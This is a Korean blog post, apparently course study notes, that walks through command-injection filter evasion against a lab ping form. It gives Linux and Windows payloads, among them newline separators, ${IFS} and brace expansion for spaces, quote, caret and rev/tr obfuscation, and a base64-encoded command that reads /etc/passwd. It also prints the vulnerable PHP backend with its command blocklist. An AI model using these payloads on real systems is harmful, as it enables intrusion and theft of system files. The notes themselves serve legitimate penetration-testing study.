---
title: "Command Injections - Filter Evasion"
date: 2026-07-20
layout: single
excerpt: "커맨드 인젝션의 필터링 구조를 확인하고, Linux와 Windows 환경에서 공백, 특수문자, 블랙리스트 명령어를 우회하는 과정을 정리한다."
author_profile: true
toc: true
toc_label: "Web Attacks"
toc_icon: "book"
toc_sticky: true
categories: [cpts-web]
tags: [web, cpts, web-attacks, command-injection]
---

커맨드 인젝션의 필터링 구조를 확인하고, Linux와 Windows 환경에서 공백, 특수문자, 블랙리스트 명령어를 우회하는 과정을 정리한다.

---

# Identifying Filters

커맨드 인젝션에서는 일반적으로 `;`, `&&`, `||` 같은 제어 연산자를 이용해 기존 명령 뒤에 새로운 명령을 연결한다.

이번 웹 페이지는 다음과 같다:

![Web Attacks](/assets/cpts-web/command-injections-filter-evasion/command-injection1.png)

Burp Suite를 실행한 후 요청을 가로채고, 다음과 같이 `;` 문자를 삽입하였다:

```text
ip=127.0.0.1;
```

하지만 명령어가 실행되지 않고 `Invalid input` 메시지가 나타났다:

![Web Attacks](/assets/cpts-web/command-injections-filter-evasion/command-injection2.png)

`&&` 나 `||` 문자열을 삽입해도 요청이 차단되었다.

따라서 `%0a` 나 `%0d` 와 같은 개행 문자를 이용해 명령어를 분리하는 방식을 시도하였다:

```text
ip=127.0.0.1%0a
```

그 결과 요청이 차단되지 않고 정상적으로 `127.0.0.1` 에 대한 ping 결과가 출력되었다:

![Web Attacks](/assets/cpts-web/command-injections-filter-evasion/command-injection3.png)

이 결과를 통해 `%0a` 문자가 필터링되지 않는다는 것을 확인할 수 있다.

## Bypassing Space Filters

이후 추가 우회 수단을 확인한 결과, `+` 와 `%20` 은 공백으로 디코딩되어 차단되었지만 `%0a` 와 `%09` 는 허용되었다.

이러한 경우 Linux의 환경 변수인 `${IFS}` 를 이용하여 공백을 우회하는 방식도 존재한다.

또한 [공백을 우회하는 방법](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)중 하나로, 터미널에서 `ls -al` 를 입력하는 대신 `{ls,-al}` 를 사용하면 공백 없이 명령어를 수행할 수 있다.

따라서 요청에 다음과 같이 작성하였다:

```text
ip=127.0.0.1%0a{ls,-al}
```

그 결과 공백 필터를 우회하고 정상적으로 파일 목록을 확인하는 데 성공하였다:

![Web Attacks](/assets/cpts-web/command-injections-filter-evasion/command-injection4.png)

---

# Bypassing Other Blacklisted Characters

다른 블랙리스트 문자 우회 방식으로 `${LS_COLORS:10:1}` 을 이용해 `;` 문자를 가져오는 방법이 있다.

각 Linux 환경에 따라 값은 달라질 수 있지만, `LS_COLORS` 변수는 대략 다음과 같은 형태이다.

```text
rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.7z=01;31:*.ace=01;31:*.alz=01;31:*.apk=01;31:*.arc=01;31:*.arj=01;31:*.bz=01;31:*.bz2=01;31:*.cab=01;31:*.cpio=01;31:*.crate=01;31:*.deb=01;31:*.drpm=01;31:*.dwm=01;31:*.dz=01;31:*.ear=01;31:*.egg=01;31:*.esd=01;31:*

# SKIP
```

이 중 특정 위치의 `;` 문자 하나를 가져오는 방식으로 접근할 수 있으며, `;` 가 필터링되어 있을 때 해당 문자를 직접 입력하지 않고 생성할 수 있다.

하지만 변수 확장을 통해 생성된 `;` 은 일반적인 Bash 파싱 과정에서 곧바로 제어 연산자로 다시 해석되지 않을 수 있다.

또한 `${PATH:0:1}` 을 이용하는 방법도 존재한다.

`PATH` 는 환경 변수를 의미하며, 대부분의 Linux 서버에서는 첫 번째 문자가 `/` 로 시작한다.

따라서 절대 경로를 입력할 때 `/` 가 막혀 있다면 `${PATH:0:1}` 을 통해 우회할 수 있다.

서버에 다음과 같은 페이로드를 전송하였다:

```text
ip=127.0.0.1%0a{ls,-la,${PATH:0:1}home}
```

그 결과 정상적으로 /home 디렉터리의 내용이 출력되었다:

![Web Attacks](/assets/cpts-web/command-injections-filter-evasion/command-injection5.png)

## Windows Character and Space Filter Bypasses

Windows CMD에서는 다음과 같은 우회 기법도 사용할 수 있다:

```powershell
C:\> echo %HOMEPATH:~6,-11%

\
```

이 경우 `%HOMEPATH%` 환경 변수의 일부를 잘라 백슬래시 `\` 문자를 가져온다.

PowerShell에서는 다음과 같은 방식이 가능하다:

```powershell
PS C:\> $env:HOMEPATH[0]

\
```

`HOMEPATH` 환경 변수의 첫 번째 문자를 가져오기 때문에 백슬래시 `\` 가 출력된다.

공백 문자를 가져오는 방식은 다음과 같다:

```powershell
PS C:\> $env:PROGRAMFILES[10]
```

일반적으로 `$env:PROGRAMFILES` 의 값은 다음과 같다:

```text
C : \ P r o g r a m     F i l e s
0 1 2 3 4 5 6 7 8 9 10 11 ...
```

인덱스는 0 부터 시작하므로, 10번 인덱스에 해당하는 문자는 공백이 된다.

다만 환경 변수에서 추출한 공백 문자가 Bash의 `${IFS}` 처럼 항상 명령어와 인자를 자동으로 분리하는 것은 아니다.

---

# Bypassing Blacklisted Commands

명령어 자체가 블랙리스트에 포함된 경우에도 우회가 가능하다.

예를 들어 `whoami` 명령어는 `"` 또는 `'` 를 중간에 삽입해도 Bash에서 동일하게 `whoami` 로 처리된다:

```text
wh"o"a"m"i

wh'o'a'm'i
```

따라서 `whoami` 명령어가 블랙리스트에 포함되어 있다면 이러한 방식을 통해 문자열 검사를 우회할 수 있다.

또한 `'`, `"`를 사용하지 않고도 다음과 같은 방식으로 명령어를 난독화할 수 있다:

```text
who$@ami

w\ho\am\i
```

우선 요청에 다음과 같이 작성하였다:

```text
ip=127.0.0.1%0awhoami
```

그 결과 `Invalid input` 이 출력되는 것으로 보아 `whoami` 가 필터링되어 있는 것을 확인할 수 있다:

![Web Attacks](/assets/cpts-web/command-injections-filter-evasion/command-injection6.png)

하지만 다음과 같이 작성하였다:

```text
ip=127.0.0.1%0awh'o'a'm'i
```

그 결과 오류가 발생하지 않고 `whoami` 명령어의 결과가 출력되는 것을 확인할 수 있다:

![Web Attacks](/assets/cpts-web/command-injections-filter-evasion/command-injection7.png)

내부 로직을 확인하기 위해 다음과 같이 작성하였다:

```text
ip=127.0.0.1%0ac'a't${IFS}index.php
```

`index.php` 내부 로직은 다음과 같다:

```php
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$output = '';

function filter($str)
{
  $operators = ['&', '|', ';', '\\', '/', ' '];
  foreach ($operators as $operator) {
    if (strpos($str, $operator)) {
      return true;
    }
  }

  $words = ['whoami', 'echo', 'cat', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'less', 'more', 'awk', 'head', 'sed', 'nc', 'netcat'];
  foreach ($words as $word) {
    if (strpos($str, $word) !== false) {
      return true;
    }
  }

  return false;
}

if (isset($_POST['ip'])) {
  $ip = $_POST['ip'];
  if (filter($ip)) {
    $output = "Invalid input";
  } else {
    $cmd = "bash -c 'ping -c 1 " . $ip . "'";
    $output = shell_exec($cmd);
  }
}
?>
```

이처럼 블랙리스트 방식으로 필터가 작동하고 있었으며, `$operators` 에 의해 절대 경로에 필요한 `/`, 그리고 `|`, `&`, `;` 등의 연산자가 차단되어 있었다.

또한 `$words` 에서는 대부분의 주요 명령어가 필터링되어 있었다.

## Windows Command Obfuscation

Windows CMD에서는 다음과 같은 방식으로 명령어를 난독화할 수 있다:

```cmd
C:\> who^ami
```

CMD에서는 `^` 가 이스케이프 문자로 처리되므로 최종적으로 `whoami` 가 실행된다.

---

# Advanced Command Obfuscation

이러한 기본적인 필터링 외에도 더 고급적인 명령어 난독화 기법이 존재한다.

예를 들어 `whoami` 와 공백이 필터링되어 있다고 가정하면 다음과 같이 우회할 수 있다:

```text
ip=127.0.0.1%0a$(tr${IFS}"[A-Z]"${IFS}"[a-z]"<<<"WhOaMi")
```

`tr` 명령어를 이용해 대소문자가 섞인 `WhOaMi` 를 소문자 `whoami` 로 변환한다.

Linux 명령어는 대소문자를 구분하기 때문에 `WhOaMi` 를 그대로 입력하면 실행되지 않는다. 따라서 실행 과정에서 소문자로 변환하여 우회할 수 있다:

![Web Attacks](/assets/cpts-web/command-injections-filter-evasion/command-injection8.png)

또한 `rev` 명령어를 활용하여 거꾸로 작성된 `whoami` 문자열을 다시 원래 상태로 변환할 수 있다:

```text
ip=127.0.0.1%0a$(rev<<<'imaohw')
```

`imaohw` 를 `rev` 명령어로 뒤집으면 `whoami` 가 되며, `$()` 에 의해 해당 결과가 명령어로 실행된다.

또한 명령어를 Base64로 인코딩한 후 서버에서 디코딩하는 방식도 존재한다.

예를 들어 먼저 실행할 명령어를 Base64로 인코딩한다:

```bash
$ echo -n "cat /etc/passwd" | base64

Y2F0IC9ldGMvcGFzc3dk
```

이후 인코딩된 문자열을 서버에 다음과 같이 전달한다:

```text
ip=127.0.0.1%0abash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)
```

백엔드에서는 `|` 문자가 필터링되고 있으므로 `<<<` 를 이용해 문자열을 표준 입력으로 전달한다.

그 결과 `/etc/passwd` 의 내용이 출력되는 것을 확인할 수 있다:

![Web Attacks](/assets/cpts-web/command-injections-filter-evasion/command-injection9.png)

## Advanced Command Obfuscation on Windows

Windows PowerShell에서 명령어를 Base64로 인코딩할 때는 일반적으로 UTF-16LE 형식을 사용한다.

따라서 PowerShell에서는 다음과 같이 인코딩할 수 있다:

```powershell
PS C:\> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

Linux에서 동일한 결과를 만들려면 다음과 같이 UTF-16LE로 변환한 후 Base64로 인코딩한다:

```bash
$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```

그 후 PowerShell에서 다음과 같이 디코딩하고 실행할 수 있다:

```powershell
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

<whoami user>
```

`iex` 는 `Invoke-Expression` 의 별칭이며, 디코딩된 `whoami` 문자열을 PowerShell 명령어로 실행한다.